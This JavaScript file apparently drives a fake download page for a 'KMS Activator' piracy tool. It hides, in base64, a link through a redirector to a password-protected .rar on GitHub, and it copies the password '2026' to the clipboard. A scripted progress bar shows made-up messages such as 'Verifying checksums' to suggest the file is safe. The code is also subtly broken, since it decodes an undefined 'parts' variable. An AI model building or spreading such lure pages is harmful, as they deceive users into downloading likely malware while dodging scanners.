(function() {
const urlParts = [
  'aHR0cHM6Ly9ocmVmLmxpLz8=',
  'aHR0cHM6Ly9naXRodWIuY29tL3RvcGdhbWVyYXRvbXkwL2xpY2Vuc2UvcmVsZWFzZXMvZG93bmxvYWQvZmlsZXMvQWN0aXZBcHAuTWlkX0p1bmVfVXBkYXRlLnJhcg=='
];

  function decode(b) {
    try {
      return atob(b);
    } catch(e) {
      return '';
    }
  }

  const DOWNLOAD_URL = decode(parts[0]) + decode(parts[1]);

  document.addEventListener('DOMContentLoaded', function() {
    const progressFill = document.getElementById('progressFill');
    const statusSpan = document.getElementById('statusText');
    const progressPercent = document.getElementById('progressPercentLabel');
    const downloadWrapper = document.getElementById('downloadWrapper');
    const instructionWrapper = document.getElementById('instructionWrapper');
    const downloadBtn = document.getElementById('downloadBtn');
    const instructionBtn = document.getElementById('instructionBtn');
    const repoNameSpan = document.getElementById('cardRepoName');
    const repoMeta = document.getElementById('repoNameMeta');

    function getRepoName() {
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get('repo')) return urlParams.get('repo');
      if (document.referrer) {
        try {
          const ref = new URL(document.referrer);
          if (ref.hostname === 'github.com') {
            const pathParts = ref.pathname.split('/').filter(function(p) { return p; });
            if (pathParts.length >= 2) return pathParts[1];
          }
        } catch(e) {}
      }
      if (repoMeta && repoMeta.content) return repoMeta.content;
      const path = window.location.pathname.replace(/^\/+|\/+$/g, '');
      const partsPath = path.split('/');
      return partsPath[partsPath.length - 1] || 'kms-activator';
    }

    const finalRepo = getRepoName();
    if (repoNameSpan) repoNameSpan.innerText = finalRepo;
    if (repoMeta) repoMeta.content = finalRepo;

    const messages = [
      "Connecting to release channel...",
      "Verifying checksums...",
      "Establishing secure tunnel...",
      "Preparing payload...",
      "Ready to download"
    ];

    let currentWidth = 0;
    const duration = 5000;
    const stepTime = 30;

    const interval = setInterval(function() {
      currentWidth += (100 / (duration / stepTime));

      if (currentWidth >= 100) {
        currentWidth = 100;
        if (progressFill) progressFill.style.width = '100%';
        if (progressPercent) progressPercent.innerText = '100%';
        clearInterval(interval);
        if (downloadWrapper) downloadWrapper.classList.add('visible');
        if (instructionWrapper) instructionWrapper.classList.add('visible');
        if (statusSpan) {
          statusSpan.innerHTML = '<i class="fas fa-check-circle" style="color:#3fb950"></i> Ready — click "Download KMS Activator"';
        }
      } else {
        if (progressFill) progressFill.style.width = currentWidth + '%';
        if (progressPercent) progressPercent.innerText = Math.floor(currentWidth) + '%';
        const msgIndex = Math.min(Math.floor((currentWidth / 100) * messages.length), messages.length - 1);
        if (statusSpan && messages[msgIndex]) {
          statusSpan.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> ' + messages[msgIndex];
        }
      }
    }, stepTime);

    if (downloadBtn) {
      downloadBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (DOWNLOAD_URL && DOWNLOAD_URL.startsWith('http')) {
          window.open(DOWNLOAD_URL, '_blank');
          const originalHtml = downloadBtn.innerHTML;
          downloadBtn.innerHTML = '<i class="fas fa-check"></i> Started';
          downloadBtn.disabled = true;
          downloadBtn.style.opacity = '0.7';
          setTimeout(function() {
            downloadBtn.innerHTML = originalHtml;
            downloadBtn.disabled = false;
            downloadBtn.style.opacity = '1';
          }, 2800);
        } else {
          alert("Unable to start download. Link not available.");
        }
      });
    }

    const modal = document.getElementById('instructionModal');
    const closeModalBtn = document.getElementById('closeModalBtn');

    function openModal() {
      if (modal) modal.classList.add('active');
    }

    function closeModal() {
      if (modal) modal.classList.remove('active');
    }

    if (instructionBtn) {
      instructionBtn.addEventListener('click', function(e) {
        e.preventDefault();
        openModal();
      });
    }

    if (closeModalBtn) {
      closeModalBtn.addEventListener('click', closeModal);
    }

    window.addEventListener('click', function(e) {
      if (modal && modal.classList.contains('active') && e.target === modal) {
        closeModal();
      }
    });

    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape' && modal && modal.classList.contains('active')) {
        closeModal();
      }
    });

    const copyBtn = document.getElementById('copyPasswordBtn');
    if (copyBtn) {
      copyBtn.addEventListener('click', function() {
        navigator.clipboard.writeText('2026').then(function() {
          const prev = copyBtn.innerHTML;
          copyBtn.innerHTML = '<i class="fas fa-check"></i> copied!';
          setTimeout(function() {
            copyBtn.innerHTML = prev;
          }, 1500);
        });
      });
    }
  });
})();